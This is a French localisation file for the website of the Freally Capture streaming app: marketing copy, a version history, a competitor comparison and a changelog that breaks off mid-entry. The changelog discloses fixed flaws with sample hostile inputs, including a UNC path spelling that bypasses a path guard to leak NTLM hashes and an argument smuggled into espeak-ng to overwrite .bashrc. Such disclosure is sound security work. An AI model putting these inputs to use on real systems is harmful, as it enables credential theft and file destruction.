(window.FREALLY_I18N = window.FREALLY_I18N || {})["fr"] = {"hero.headline":"<span class=\"hl-muted\">Enregistrez et diffusez comme un studio.</span> <span class=\"cycle\" data-cycle=\"hero.cycle\">Une seule application épurée.</span>","hero.cycle":"Une seule application épurée.|Toutes les plateformes à la fois.|Sans compte, sans IA.","hero.sub":"Un studio de diffusion en direct et d'enregistrement pour Windows, macOS et Linux. Pas de compte, pas de télémétrie et aucun service cloud de notre part : votre flux va directement aux plateformes que vous choisissez.","hero.chipDesktop":"Application de bureau","what.title":"Ce que c'est","what.p1":"Passer en direct demande généralement une application pour capturer, une autre pour mixer le son, un service pour envoyer le flux à plusieurs plateformes, et un compte chez chacun.","what.p2":"Freally Capture est un seul studio sur votre propre ordinateur. Composez une scène à partir de votre écran, de fenêtres, de caméras, de médias et d'incrustations ; assemblez-la sur la carte graphique ; enregistrez-la sur jusqu'à six pistes audio ; et diffusez-la sur plusieurs plateformes à la fois, directement depuis votre machine, sans relais intermédiaire.","what.p3":"Il ne demande aucun compte et n'envoie aucune télémétrie. Ce qui quitte votre ordinateur, c'est le flux que vous avez choisi d'envoyer, plus les quelques connexions que vous activez vous-même — chacune décrite clairement dans la documentation.","features.title":"Ce qu'il contient","features.scenes.title":"Des scènes sur le GPU","features.scenes.body":"Composez des scènes à partir d'écrans, de fenêtres, de jeux, de caméras, de pages web, de médias, d'images et de texte, et assemblez-les en direct sur la carte graphique avec des filtres et des transitions.","features.multistream.title":"Multistream, en direct","features.multistream.body":"Passez en direct sur Twitch, YouTube, Kick, Facebook, Trovo ou votre propre serveur — sur plusieurs à la fois — en RTMP, RTMPS, SRT ou WHIP, directement depuis votre machine.","features.record.title":"Enregistrement multipiste","features.record.body":"Enregistrez avec l'encodeur matériel de votre carte graphique ou sans perte dans le format propre à Capture, sur jusqu'à six pistes audio, avec découpage des fichiers, marqueurs de chapitre et fichiers qui résistent aux plantages.","features.audio.title":"Une console de diffusion","features.audio.body":"Chaque source sur sa propre tranche, avec réduction du bruit, noise gate, compresseur, égaliseur et mesure de la sonie — uniquement du traitement du signal classique, sans aucune IA.","features.safety.title":"Mode Studio et sécurité","features.safety.body":"Préparez les changements dans l'aperçu avant qu'ils passent à l'antenne, vérifiez tout avec une check-list avant le direct, et gardez à portée de main les alarmes, le basculement d'encodeur et un bouton panique.","features.guests.title":"Invités à distance","features.guests.body":"Invitez jusqu'à huit invités avec un lien. Ils rejoignent depuis un navigateur web, et leur caméra et leur micro vous parviennent directement, en pair à pair.","features.deep.title":"Caméra virtuelle, source navigateur, capture de jeu","features.deep.body":"Votre programme comme webcam pour les appels vidéo, n'importe quelle page web comme source, et les jeux en plein écran exclusif — d'abord sous Windows, chaque limite étant signalée.","features.free.title":"Gratuit aujourd'hui, local, sans IA","features.free.body":"Pas d'offre payante, pas de compte, pas de télémétrie et pas de modèle. Vos scènes, vos enregistrements et vos clés de stream restent sur votre ordinateur.","ladder.title":"Version après version","ladder.intro":"Toutes les versions de Freally Capture à ce jour, des fondations à la version actuelle. Le journal des modifications donne le détail de chacune.","ladder.rung.v0.10.0":"Les fondations : l'interface de l'application de bureau sur son propre moteur, les vérifications de build sous Windows, macOS et Linux, et ce site.","ladder.rung.v0.25.0":"La capture : écrans, fenêtres et webcams sous Windows, macOS et Linux, en direct dans l'aperçu.","ladder.rung.v0.40.0":"Le compositeur GPU : des scènes construites à partir de sources et assemblées sur la carte graphique, avec des filtres comme l'incrustation chroma, la correction colorimétrique, les LUT et le flou.","ladder.rung.v0.55.0":"Audio et enregistrement : une console jusqu'à six pistes avec des filtres DSP classiques, et l'enregistrement multipiste avec encodeurs matériels et le format sans perte propre à Capture.","ladder.rung.v0.56.0":"Un aperçu GPU natif : le programme dessiné directement depuis le compositeur, sans latence.","ladder.rung.v0.70.0":"Le studio : diffusion vers Twitch, YouTube, Kick, Facebook et Trovo avec reconnexion automatique, mode Studio avec transitions, raccourcis clavier, profils et un panneau de statistiques.","ladder.rung.v0.85.0":"La diffusion en profondeur : multistream vers plusieurs plateformes à la fois, SRT et WHIP, un canevas vertical, des scènes imbriquées, un tampon de replay et une incrustation de chat sans connexion.","ladder.rung.v0.90.0":"Contrôle à distance et extensions : une API WebSocket protégée par mot de passe, des panneaux navigateur, des scripts Lua en bac à sable et un SDK de plugins, tout en local et désactivé par défaut.","ladder.rung.v0.95.0":"La distribution : un outil de mise à jour automatique signé, l'audio capturé par application, et le contrat de licence au premier lancement.","ladder.rung.v0.96.0":"Un studio pour tous : 18 langues, la prise en charge complète du clavier et des lecteurs d'écran, un assistant de configuration au premier lancement, une palette de commandes et des thèmes.","ladder.rung.v0.97.0":"Création de scènes et contrôle : annuler et rétablir, un importateur de collections de scènes OBS, des guides d'alignement, un atelier d'incrustation, une multivue et des projecteurs.","ladder.rung.v0.98.0":"La sécurité de diffusion : une check-list avant le direct, des alarmes, un tableau de bord de l'état des sources, le basculement d'encodeur, l'enregistrement qui résiste aux plantages, un bouton panique et une protection à la fermeture.","ladder.rung.v0.99.0":"Sources, appareils et calibrage : signaux de test, calibrage de la synchro audio-vidéo, minuteurs et horloges, texte depuis un fichier, une carte des raccourcis, le désentrelacement et les réglages de caméra.","ladder.rung.v0.200.0":"Automatisation et capture en profondeur : règles, macros, contrôle MIDI et OSC, un panneau tactile en réseau local, des voyants tally, des caméras PTZ et un conducteur d'émission, plus le zoom de recadrage et le mappage de tons HDR vers SDR.","ladder.rung.v0.300.0":"Nouvelles sources et incrustations : ralenti instantané, une playlist sans blanc, un concepteur de titres et de tableaux de score, un visualiseur audio, une incrustation de statistiques, un chronomètre à temps intermédiaires, une incrustation des entrées, la réception en réseau local et Freally Link.","ladder.rung.v0.400.0":"Le compositeur en profondeur : déformation 3D par coins, incrustateurs en aval, image figée, plus de flous, la transition de déplacement, un studio de shaders WGSL, des masques de Bézier et des stingers à cache.","ladder.rung.v0.500.0":"La production audio : routage des sorties, une matrice de ducking, un mixeur automatique, la normalisation de la sonie, un égaliseur paramétrique, un soundboard, l'enregistrement de podcasts et la détection des plugins CLAP et VST3.","ladder.rung.v0.600.0":"Enregistrement et replay en profondeur : enregistrement ISO par source, un découpeur de clips, l'enregistrement avec transparence, des marqueurs automatiques, une chaîne de traitement après l'enregistrement, une vérification d'intégrité et le timecode SMPTE.","ladder.rung.v0.700.0":"Comprendre la diffusion : un simulateur de réseau, un mode répétition, une chronologie des images perdues, un rapport de session, un banc d'essai des encodeurs, et des sources visibles seulement dans le flux ou seulement dans l'enregistrement.","ladder.rung.v0.800.0":"Invités à distance et production d'émission : jusqu'à huit invités, une salle d'attente, des consignes, un tableau de bord de la qualité de connexion, un télestrateur, un prompteur et des grilles d'invités automatiques.","ladder.rung.v0.900.0":"La gestion du studio : paquets de scènes, comparaison et fusion, instantanés nommés, mode portable, sauvegardes en un fichier, un éditeur de thèmes et des dispositions de panneaux.","ladder.rung.v0.910.0":"Le prompteur, repensé : pastilles de pause, un compte à rebours de départ, un rythme en BPM, la lecture à voix haute et l'autocomplétion dans les 18 langues.","ladder.rung.v1.0.0":"La première version stable : toutes les fonctionnalités prévues, plus un compte à rebours « Ça commence bientôt », une musique de fond, une barre des réseaux sociaux et un bandeau de message de chat mis en avant.","ladder.rung.v1.1.0":"Un MP4 facile à partager, écrit à côté de chaque enregistrement sans perte à son arrêt.","ladder.rung.v1.2.0":"Capture avancée et web : une caméra virtuelle, une vraie source navigateur et la capture de jeu, d'abord sous Windows.","ladder.rung.v1.2.1":"L'audit : aucune nouvelle fonctionnalité, une passe complète de sécurité et de correction, et les trois ajouts de 1.2.0 rendus fonctionnels.","ladder.note":"Chaque version listée est terminée. Ce qui viendra après 1.2.1 est prévu en privé et apparaîtra ici une fois publié. Aucune n'est téléchargeable sur ce site.","honest.title":"Ce que la plupart des sites relèguent tout en bas","honest.windows.title":"Certaines des fonctionnalités les plus récentes sont réservées à Windows","honest.windows.body":"Dans 1.2.1, la caméra virtuelle, la capture de jeu et les effets de curseur ne fonctionnent que sous Windows, et la source navigateur a d'abord été vérifiée sous Windows. Le reste du studio fonctionne sous Windows, macOS et Linux.","honest.signed.title":"Deux composants ne sont pas encore signés","honest.signed.body":"Le composant système de la caméra virtuelle et l'environnement d'exécution de la source navigateur ne sont pas encore signés, et deux tests en conditions réelles restent à faire : la caméra dans un véritable appel vidéo, et la capture de jeu dans un jeu protégé. Le journal des modifications le signale dans la version qui les a ajoutés.","honest.network.title":"Ce qui passe vraiment par Internet","honest.network.body":"Vos flux vont aux plateformes que vous configurez. L'établissement de la connexion d'une session avec des invités passe par un service de signalisation public ; une incrustation de chat lit le chat public d'une chaîne ; ffmpeg et l'environnement d'exécution du navigateur sont téléchargés la première fois que vous en avez besoin ; l'application vérifie les mises à jour ; et un rapport de problème ne part que si vous appuyez sur Envoyer sur sa page. À part la vérification des mises à jour, chacun de ces échanges n'a lieu que parce que vous l'avez configuré.","honest.downloads.title":"Aucun téléchargement ici","honest.downloads.body":"Ce site décrit Freally Capture ; il ne le distribue pas. Il n'y a ni page, ni lien, ni bouton de téléchargement, et le code source est privé.","site.tagline":"Enregistrez et diffusez comme un studio — scènes, sources, multistream, une seule application épurée.","footer.licence":"Propriétaire — Tous droits réservés. © Mike Weaver. Utilisation gratuite aujourd'hui ; les versions futures pourraient être vendues. Ce n'est pas un logiciel libre.","footer.yours":"Ce que vous enregistrez et diffusez vous appartient, tout comme la responsabilité qui va avec. L'auteur de Freally Capture n'en reçoit, n'en stocke et n'en relaie rien.","featuresPage.lead":"Un studio de diffusion en direct et d'enregistrement sur votre propre ordinateur : des scènes assemblées sur la carte graphique, l'enregistrement multipiste et le multistream vers toutes les plateformes à la fois, directement depuis votre machine.","featuresPage.version":"Cette page décrit Freally Capture 1.2.1, la version publiée : tout ce qu'elle présente se trouve dans 1.2.1, et rien de ce qui est prévu pour plus tard n'y figure.","featuresPage.numbers.intro":"Chaque chiffre correspond à ce que fait la version 1.2.1, compté à partir de son code et de son journal des modifications. Rien n'est arrondi à la hausse.","featuresPage.numbers.systems":"systèmes d'exploitation : Windows, macOS et Linux","featuresPage.numbers.protocols":"protocoles de diffusion : RTMP, RTMPS, SRT et WHIP","featuresPage.numbers.platforms":"plateformes intégrées — Twitch, YouTube, Kick, Facebook et Trovo — plus n'importe quel serveur à vous","featuresPage.numbers.tracks":"pistes audio dans un enregistrement","featuresPage.numbers.encoders":"familles d'encodeurs matériels : NVENC, Quick Sync, AMF, VAAPI et VideoToolbox","featuresPage.numbers.guests":"invités à distance dans une session","featuresPage.numbers.languages":"langues","featuresPage.numbers.accounts":"compte à créer","featuresPage.numbers.ai":"modèles d'IA","featuresPage.numbers.price":"prix aujourd'hui","featuresPage.free.title":"Gratuit aujourd'hui","featuresPage.free.body":"Tout ce que fait Freally Capture aujourd'hui est gratuit, pour tout le monde : pas d'offre payante, pas d'abonnement, pas de compte, pas de filigrane et pas de période d'essai qui expire. Ce que vous enregistrez et diffusez vous appartient.","featuresPage.cards.title":"Ce que fait la version 1.2.1","featuresPage.cards.scenes.title":"Scènes et sources sur le GPU","featuresPage.cards.scenes.body":"Écrans, fenêtres, jeux, webcams et cartes d'acquisition, pages web, médias, playlists, images, texte, minuteurs et signaux de test, assemblés en direct sur la carte graphique. Scènes imbriquées, groupes, sources partagées, un canevas vertical 9:16, et l'annulation de chaque modification.","featuresPage.cards.effects.title":"Filtres et transitions","featuresPage.cards.effects.body":"Incrustation chroma, correction colorimétrique, LUT, masques, une famille de flous, inclinaison 3D et vos propres shaders WGSL, sur chaque source. Coupe, fondu, glissement, stinger, volet luma et une transition de déplacement qui fait glisser les éléments d'une scène à l'autre.","featuresPage.cards.studio.title":"Mode Studio et contrôle","featuresPage.cards.studio.body":"Préparez le plan suivant dans l'aperçu et envoyez-le au programme quand il est prêt. Une multivue, des projecteurs plein écran sur n'importe quel écran, des incrustateurs en aval au-dessus de chaque scène et un panneau de statistiques avec de vrais chiffres.","featuresPage.cards.multistream.title":"Multistream, directement depuis votre machine","featuresPage.cards.multistream.body":"Passez en direct sur plusieurs plateformes à la fois en RTMP, RTMPS, SRT ou WHIP, sans service de relais entre les deux. Chaque destination se reconnecte seule, si bien qu'une destination en panne n'entraîne jamais les autres.","featuresPage.cards.recording.title":"Des enregistrements qui tiennent bon","featuresPage.cards.recording.body":"Encodeurs matériels, avec x264 en solution de repli, vers MP4, MKV, MOV ou WebM, ou dans le format sans perte propre à Capture ; jusqu'à six pistes audio ; un fichier propre par source ; des enregistrements qui survivent à un plantage, et une réparation au lancement suivant.","featuresPage.cards.audio.title":"Une console audio de diffusion","featuresPage.cards.audio.body":"Réduction du bruit, noise gate, compresseur, limiteur, égaliseur paramétrique et de-esser sur chaque tranche, avec ducking, un mixeur automatique, la normalisation de la sonie, un soundboard et l'enregistrement de podcasts. Du traitement du signal classique, sans IA.","featuresPage.cards.replay.title":"Ralenti instantané","featuresPage.cards.replay.body":"Un tampon de replay continu qui sauvegarde les derniers instants d'une seule touche, et une source de replay qui les remet à l'antenne à vitesse normale, à moitié ou au quart de la vitesse. Un découpeur de clips exporte sans réencodage quand c'est possible.","featuresPage.cards.guests.title":"Des invités depuis le navigateur","featuresPage.cards.guests.body":"Jusqu'à huit invités rejoignent via un lien, dans un navigateur web, sans rien installer. Une salle d'attente, des consignes privées, la connexion de chaque invité d'un coup d'œil et une grille automatique avec des noms à l'écran.","featuresPage.cards.safety.title":"Sécurité de diffusion","featuresPage.cards.safety.body":"Une check-list avant le direct, des alarmes en cas de silence, de saturation, d'image figée ou de disque qui se remplit, le basculement d'encodeur en pleine émission, un bouton panique, un mode répétition qui n'envoie rien, et une fermeture qui termine tout dans l'ordre.","featuresPage.cards.automation.title":"Automatisation et contrôle","featuresPage.cards.automation.body":"Règles, macros et variables ; contrôleurs MIDI et OSC ; un panneau tactile et des voyants tally sur votre téléphone ; des caméras PTZ ; un conducteur d'émission ; une API WebSocket pour le Stream Deck ; des scripts Lua et des plugins. Tout est désactivé par défaut.","featuresPage.cards.deep.title":"Caméra virtuelle, source navigateur, capture de jeu","featuresPage.cards.deep.body":"Votre programme comme webcam pour les applications d'appel vidéo ; n'importe quelle page web rendue comme source ; et les jeux en plein écran exclusif grâce à un hook que vous autorisez jeu par jeu. D'abord sous Windows, avec les limites indiquées plus bas.","featuresPage.cards.private.title":"Local, privé, sans IA","featuresPage.cards.private.body":"Pas de compte, pas de télémétrie et aucun service cloud de notre part. Vos enregistrements et vos clés de stream restent sur votre ordinateur, et aucun filtre n'utilise de modèle : tous relèvent du traitement du signal classique.","featuresPage.compare.title":"Face aux studios commerciaux","featuresPage.compare.intro":"Freally Capture à côté des studios commerciaux qu'on utilise pour diffuser et enregistrer. La colonne de Capture correspond à la version publiée, 1.2.1. Chaque cellule d'un autre produit provient des pages de son propre éditeur, vérifiées le 2 octobre 2026, et les prix sont les prix catalogue américains d'octobre 2026.","featuresPage.compare.feature":"Fonctionnalité","featuresPage.compare.row.price":"Prix (USD, octobre 2026)","featuresPage.compare.freeToday":"Gratuit aujourd'hui","featuresPage.compare.price.streamlabs":"27 $ par mois ou 189 $ par an","featuresPage.compare.price.xsplit":"14,99 $ par mois, 59,99 $ par an ou 119,99 $ en une fois","featuresPage.compare.price.vmix":"1 200 $ en une fois","featuresPage.compare.price.wirecast":"79 $ par mois, ou 504 $ par an","featuresPage.compare.price.ecamm":"40 $ par mois ou 384 $ par an","featuresPage.compare.price.restream":"19 $ par mois ou 190 $ par an","featuresPage.compare.row.systems":"Fonctionne sous Windows, macOS et Linux","featuresPage.compare.legend.yes":"présent","featuresPage.compare.legend.partly":"en partie","featuresPage.compare.note.browser":"dans un navigateur web","featuresPage.compare.row.multistream":"Diffuse sur plusieurs plateformes à la fois","featuresPage.compare.note.channels3":"3 chaînes avec cette offre","featuresPage.compare.row.direct":"…directement depuis votre ordinateur, sans service de relais entre les deux","featuresPage.compare.legend.no":"absent","featuresPage.compare.note.servers":"via les serveurs de l'éditeur","featuresPage.compare.row.srt":"Sortie SRT","featuresPage.compare.legend.unknown":"non vérifié","featuresPage.compare.note.business":"à partir de l'offre Business","featuresPage.compare.row.whip":"Sortie WHIP (WebRTC)","featuresPage.compare.note.customStream":"sortie « Custom Stream »","featuresPage.compare.note.beta":"en bêta","featuresPage.compare.row.vcam":"Une caméra virtuelle pour les appels vidéo","featuresPage.compare.note.windowsOnly":"Windows uniquement, pour l'instant","featuresPage.compare.row.guests":"Les invités rejoignent depuis un navigateur web","featuresPage.compare.note.p2p":"jusqu'à 8, en pair à pair","featuresPage.compare.note.collab":"jusqu'à 11 invités ou caméras","featuresPage.compare.note.vmixCall":"jusqu'à 8, via vMix Call","featuresPage.compare.note.rendezvous":"jusqu'à 7, via Rendezvous","featuresPage.compare.note.ecammGuests":"jusqu'à 10 sur Apple Silicon","featuresPage.compare.note.restreamGuests":"10 à l'écran, hôte compris","featuresPage.compare.row.replay":"Ralenti instantané","featuresPage.compare.row.tracks":"Plusieurs pistes audio dans un enregistrement","featuresPage.compare.note.tracks6":"jusqu'à 6 pistes","featuresPage.compare.note.tracks5":"5 pistes","featuresPage.compare.note.channels":"en canaux, AVI ou WAV seulement","featuresPage.compare.note.tracks8":"jusqu'à 8 pistes","featuresPage.compare.note.separateFiles":"en fichiers séparés","featuresPage.compare.note.professional":"à partir de l'offre Professional","featuresPage.compare.row.account":"Fonctionne sans compte","featuresPage.compare.note.recordingOnly":"seulement pour enregistrer","featuresPage.compare.note.licenceAccount":"licence liée à un compte","featuresPage.compare.note.key":"une clé de licence","featuresPage.compare.note.signIn":"connexion requise","featuresPage.compare.row.noAi":"Aucune fonctionnalité d'IA","featuresPage.compare.note.aiHighlights":"temps forts de jeu par IA","featuresPage.compare.note.aiBackground":"suppression d'arrière-plan par IA","featuresPage.compare.note.aiClips":"clips et musique par IA","featuresPage.compare.summaryTitle":"En bref","featuresPage.compare.summary":"Ce que Freally Capture a et que les autres n'ont pas : c'est la seule application de bureau ici à fonctionner sous Linux en plus de Windows et macOS, et la seule à être gratuite. Quatre des six exigent un compte et quatre ont des fonctionnalités d'IA ; Capture n'a ni l'un ni l'autre, et il diffuse sur plusieurs plateformes directement depuis votre ordinateur, là où Streamlabs et Restream font transiter votre flux par leurs propres serveurs.","featuresPage.compare.theyWinTitle":"Là où ils gagnent","featuresPage.compare.theyWin":"Là où ils gagnent : Wirecast Pro enregistre jusqu'à 8 pistes audio contre 6 pour Capture, et Streamlabs Ultra accueille jusqu'à 11 invités ou caméras et Ecamm jusqu'à 10, contre 8 pour Capture. Streamlabs, XSplit, vMix, Wirecast et Ecamm ont tous une caméra virtuelle ; celle de Capture ne fonctionne que sous Windows dans 1.2.1 et n'est pas encore signée.","featuresPage.compare.obsTitle":"Et OBS Studio ?","featuresPage.compare.obs":"OBS Studio est lui aussi gratuit et open source, fonctionne sur les trois systèmes, et propose SRT, WHIP, une caméra virtuelle, un tampon de replay et six pistes audio. Pour diffuser sur plusieurs plateformes à la fois, il lui faut un plugin tiers ; dans Capture, c'est intégré, tout comme les invités qui rejoignent depuis un navigateur.","featuresPage.compare.asOf":"Le prix de Capture est celui d'aujourd'hui : il est gratuit aujourd'hui, et les versions futures pourraient être vendues. Les autres produits évoluent aussi ; ce tableau reflète la situation au 2 octobre 2026.","featuresPage.why.title":"Pourquoi il est conçu ainsi","featuresPage.why.local.title":"Tout reste sur votre machine","featuresPage.why.local.body":"Un outil de diffusion ne devrait jamais devenir « connectez votre chaîne ». Il n'y a aucun compte à créer et aucun relais de notre part au milieu : votre flux va de votre ordinateur aux plateformes que vous avez choisies.","featuresPage.why.owned.title":"Son propre moteur","featuresPage.why.owned.body":"Le compositeur, le moteur audio et le format d'enregistrement sans perte appartiennent à Capture. Les codecs qu'exigent les plateformes viennent de ffmpeg, téléchargé la première fois que vous en avez besoin plutôt que fourni avec l'application.","featuresPage.why.dsp.title":"Traitement du signal classique","featuresPage.why.dsp.body":"La réduction du bruit, l'incrustation et le mappage de tons sont des formules, pas des modèles. La même entrée avec les mêmes réglages donne le même résultat, et rien n'est téléchargé pour les faire fonctionner.","featuresPage.why.safe.title":"Désactivé tant que vous ne l'activez pas","featuresPage.why.safe.body":"Chaque écoute réseau, chaque automatisation et chaque capture risquée est désactivée par défaut. La capture de jeu vous demande votre accord pour chaque jeu, et une collection de scènes partagée ne peut jamais transporter cette autorisation.","featuresPage.why.honest.title":"Honnête sur ses limites","featuresPage.why.honest.body":"Quand une fonctionnalité ne fonctionne que sur un seul système, n'est pas encore signée ou attend encore un test en conditions réelles, l'application, le journal des modifications et cette page le disent.","featuresPage.limits.heading":"Les limites, sans détour","featuresPage.limits.intro":"Une liste de fonctionnalités qui cache ses lacunes ne vaut pas la peine d’être lue. Tout ce qui précède est dans la version 1.2.1, et voici ce qu’elle ne fait pas.","featuresPage.limits.title":"Ce que 1.2.1 ne fait pas","featuresPage.limits.vcam":"La caméra virtuelle ne fonctionne que sous Windows ; les caméras pour macOS et Linux ne font pas partie de cette version.","featuresPage.limits.game":"La capture de jeu ne fonctionne que sous Windows et copie les jeux Direct3D 11 ; les jeux HDR et Direct3D 12 basculent sur la capture de fenêtre.","featuresPage.limits.browser":"La source navigateur affiche l'image d'une page, mais pas encore son son.","featuresPage.limits.signed":"Le composant système de la caméra virtuelle et l'environnement d'exécution du navigateur ne sont pas encore signés, et deux tests en conditions réelles restent à faire : la caméra dans un véritable appel vidéo, et la capture de jeu dans un jeu protégé.","featuresPage.limits.cursor":"Les effets de curseur et l'incrustation clavier et souris ne fonctionnent que sous Windows.","featuresPage.limits.ai":"Il n'a aucune fonctionnalité d'IA — ni suppression d'arrière-plan, ni sous-titres, ni extraits de temps forts par IA — et c'est voulu.","featuresPage.limits.downloads":"Il n'y a aucun téléchargement sur ce site, ni sur cette page.","docs.intro":"Comment utiliser Freally Capture, version 1.2.1 : composer une scène, l'enregistrer, passer en direct, et tout ce qui l'entoure. Chaque section indique sur quels systèmes une fonctionnalité fonctionne quand ce ne sont pas les trois.","kit.skip":"Passer au contenu","kit.nav.site":"Site","kit.nav.home":"Accueil","kit.nav.features":"Fonctionnalités","kit.nav.documentation":"Documentation","kit.nav.changelog":"Journal des modifications","kit.nav.language":"Langue","kit.nav.allApps":"Toutes les apps Freally","kit.badge.done":"v1.2.1 est terminée","kit.cta.features":"Voir toutes les fonctionnalités","kit.cta.docs":"Lire la documentation","kit.price":"Freally Capture est gratuit aujourd'hui, mais ne le restera peut-être pas toujours : les versions futures pourraient être vendues.","kit.noDownloads":"Il n'y a pas encore de téléchargement, et le code source est privé.","kit.label.overview":"Aperçu","kit.label.inside":"À l'intérieur","kit.label.roadmap":"Feuille de route","kit.ladder.done":"Fait","kit.label.honesty":"Honnêteté","kit.family.label":"La famille Freally","kit.family.title":"<span class=\"hl-muted\">Une famille.</span> <span class=\"hl-bright\">Huit apps.</span>","kit.cta.label":"Ce qui a changé","kit.cta.title":"<span class=\"hl-muted\">Chaque version,</span> <span class=\"hl-bright\">consignée.</span>","kit.cta.lede":"Le journal des modifications recense tout ce qui a changé dans Freally Capture, version après version, dans les dix-huit langues.","kit.cta.changelog":"Lire le journal des modifications","kit.footer.thisApp":"Cette app","kit.footer.family":"La famille Freally","kit.status.version":"Version 1.2.1","kit.head.features":"<span class=\"hl-muted\">Tout ce qu'il fait,</span> <span class=\"hl-bright\">côte à côte.</span>","kit.label.numbers":"En chiffres","kit.label.free":"Gratuit aujourd'hui","kit.label.compare":"Comparaison","kit.label.principles":"Principes","kit.label.limits":"Limites","kit.states.title":"Ce que signifient les états","kit.states.done":"construite et étiquetée, mais pas un téléchargement sur ce site","kit.states.ladder":"Voir chaque échelon de la route","kit.head.documentation":"<span class=\"hl-muted\">Comment ça marche,</span> <span class=\"hl-bright\">étape par étape.</span>","kit.search.placeholder":"Rechercher dans la documentation","kit.docs.contents":"Sommaire","kit.head.changelog":"<span class=\"hl-muted\">Chaque changement,</span> <span class=\"hl-bright\">version après version.</span>","kit.changelog.lede":"Le plus récent d'abord : tout ce qui a changé dans Freally Capture, dans chaque langue de ce site.","kit.changelog.versions":"Versions","kit.search.none":"Rien sur ce site ne correspond à cela.","changelog.bd0bded7ecb3":"<span class=\"release__meta\"><span class=\"release__ver\">v1.2.1</span><time class=\"release__date\" datetime=\"2026-08-20\">2026-08-20</time></span><span class=\"release__title\">(Operation_Optimization — audit, durcissement et fonctions rendues accessibles)</span>","changelog.52c9ccef246a":"<strong>Un audit de l'ensemble du code, et les correctifs qu'il a fait apparaître.</strong> Chaque section de l'application — environ 147k lignes réparties en 13 sections — est passée par <code>/simplify</code>, <code>/security-review</code> et <code>/code-review</code>. Rien de nouveau n'a été ajouté. Ce qui change, c'est que plusieurs éléments <em>livrés</em> dans 1.2.0 <strong>fonctionnent</strong> désormais vraiment : la capture de jeu n'atteignait aucun titre récent, la caméra virtuelle ne pouvait pas du tout être démarrée, et la source navigateur était absente du menu. À côté de cela, une protection de chemin dont dépendent toutes les autres protections de l'application pouvait être contournée avec un seul caractère.","changelog.b16452720739":"Corrigé — sécurité","changelog.d62edfd54f4e":"<strong>La protection des chemins réseau ignorait deux graphies UNC qu'accepte Windows.</strong> <code>is_remote</code> testait <code>\\\\</code> et <code>//</code> mais ni <code>/\\</code> ni <code>\\/</code>, alors que Win32 traite les séparateurs de façon interchangeable dans ce préfixe de deux caractères — <code>GetFullPath(&quot;/\\localhost\\C$\\Windows&quot;)</code> se résout réellement en <code>\\\\localhost\\C$\\Windows</code>. Comme ce seul prédicat sous-tend <em>toutes</em> les vérifications de chemin de l'application (enregistrements, affichage de dossier, import de pack, la chaîne post-enregistrement, l'automatisation et six protections du studio), un seul caractère substitué aboutissait à une vraie connexion SMB et divulguait un hachage d'identifiants NTLM à un hôte choisi par l'attaquant. Les deux séparateurs sont désormais normalisés et les espaces en tête supprimés.","changelog.57f43b5bfb70":"<strong>L'injection de la capture de jeu se fiait à un pid peut-être réutilisé.</strong> <code>inject()</code> vérifiait le consentement par rapport au nom d'exécutable transmis par l'<em>appelant</em>, jamais par rapport au processus réellement ouvert — et Windows recycle les pid de façon agressive entre la recherche de la fenêtre et <code>OpenProcess</code>. Elle interroge désormais le nom de l'image à partir du handle ouvert et revérifie le consentement avant <code>CreateRemoteThread</code>.","changelog.14fb39bd677f":"<strong>WHIP acceptait <code>http://</code>.</strong> Pour WHIP, la clé de stream <em>est</em> le jeton bearer : un point de terminaison en clair faisait donc circuler l'identifiant en clair sur le réseau à chaque reconnexion. Désormais <code>https</code> uniquement.","changelog.e53e8143a9a0":"<strong>Il manquait <code>--</code> avant le texte de l'utilisateur dans <code>espeak-ng</code></strong> (la branche <code>spd-say</code> l'avait déjà) : une ligne du prompteur comme <code>-w/home/user/.bashrc</code> lui faisait écrire un WAV par-dessus ce fichier.","changelog.27867a99df1e":"<strong>La règle « chemins absolus uniquement » de NDI n'était qu'un <code>debug_assert!</code></strong> — retiré à la compilation de la version distribuée, ce qui laissait une variable d'environnement modifiable par l'utilisateur orienter <code>LoadLibraryW</code> vers un chemin relatif.","changelog.e7e404533641":"<strong>Le jeton d'invitation des invités à distance a quitté la chaîne de requête</strong> pour le fragment de l'URL : il n'apparaît donc plus dans les journaux d'accès de Pages, dans l'historique du navigateur ni dans un en-tête <code>Referer</code> envoyé à une autre origine.","changelog.db73bbe95da1":"<strong>La phrase secrète de réception SRT est masquée</strong>, comme tous les autres champs secrets de l'application.","changelog.e6d73277285d":"Corrigé — plantages et exactitude","changelog.66b4f9443b67":"<strong>Le compositeur pouvait paniquer sur le thread de rendu.</strong> Il vidait tout le cache des pipelines de shaders utilisateur en pleine image alors que <code>compose_scene</code> détenait encore des plans qui pointaient dedans, puis appelait <code>.expect()</code> — un cas atteignable avec deux filtres de shader et une édition en direct ordinaire, car chaque frappe dans l'éditeur de shaders produit un nouveau hachage. Les recherches peuvent désormais échouer sans paniquer, et l'éviction ne supprime que les compilations ratées.","changelog.b9e2ec0e1165":"<strong>Aucun gestionnaire d'erreurs wgpu non capturées n'était installé</strong> : toute erreur de validation ou de mémoire insuffisante, où que ce soit dans le compositeur, faisait donc paniquer le processus. Elle est désormais journalisée, et l'image est abandonnée.","changelog.b8bd5c6887ba":"<strong>Les groupes masqués apparaissaient à l'antenne pendant les transitions de déplacement</strong> — tous les autres chemins de composition respectent <code>group_hides</code> ; celui du morphing non, si bien que les éléments masqués étaient enregistrés et diffusés pendant toute la durée de la transition.","changelog.a87472f8edb5":"<strong>La diffusion et le replay refusent désormais une image de mauvaise taille.</strong> Le canevas peut changer en cours de session et les encodeurs reçoivent des images brutes de taille fixe : un seul tampon de mauvaise taille désynchronisait donc le flux d'octets pour le reste de l'émission, alors que le statut affichait toujours « en direct ».","changelog.42b801d420c3":"<strong>Un sous-remplissage audio n'avait aucune reprise.</strong> Une fois le pré-tampon de 30 ms épuisé, chaque bloc suivant était un bloc partiel complété de silence — un grésillement continu plutôt qu'un accroc isolé.","changelog.b31061525f09":"Des identifiants d'élément en double n'indexent plus au-delà du cache de la chaîne de filtres ; une durée de fondu NaN fait ignorer le filtre au lieu de masquer la source pour toujours ; les images de masque trop grandes sont refusées au lieu de faire paniquer wgpu ; et <code>fader_gain</code> a reçu la protection <code>is_finite</code> que sa fonction sœur avait déjà (un NaN y reste collé et contamine définitivement le mix master, la mesure LUFS et l'enregistrement).","changelog.c77e993871b2":"Corrigé — la capture de jeu CAP-N78 fonctionne désormais avec les titres récents","changelog.9f9efaee9c7f":"<strong>Seul <code>IDXGISwapChain::Present</code> était hooké.</strong> Les jeux DXGI 1.2+ en <strong>modèle flip</strong> — l'essentiel de ce qui tourne en plein écran exclusif — présentent via <code>Present1</code> et ne touchent jamais cet emplacement : l'injection signalait donc un succès sans qu'une seule image n'arrive jamais. Les deux emplacements sont désormais 